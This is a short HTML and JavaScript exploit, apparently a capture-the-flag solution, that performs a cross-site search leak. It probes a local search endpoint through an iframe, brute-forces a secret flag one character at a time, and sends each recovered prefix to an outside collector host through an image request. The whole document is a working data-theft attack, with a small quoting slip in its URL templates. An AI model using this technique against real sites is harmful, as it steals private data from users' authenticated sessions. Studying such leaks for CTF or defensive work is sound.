<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }

    async function search(query) {
        try {
            await req(
              "http://127.0.0.1:8000/search?q=${query}"
            );
            return true;
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}"
        let secret = "";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = "https://mgpdcqq.request.dreamhack.games/?c=${secret}";
                    break;
                }
            }
        }
    }
    exploit();
</script>
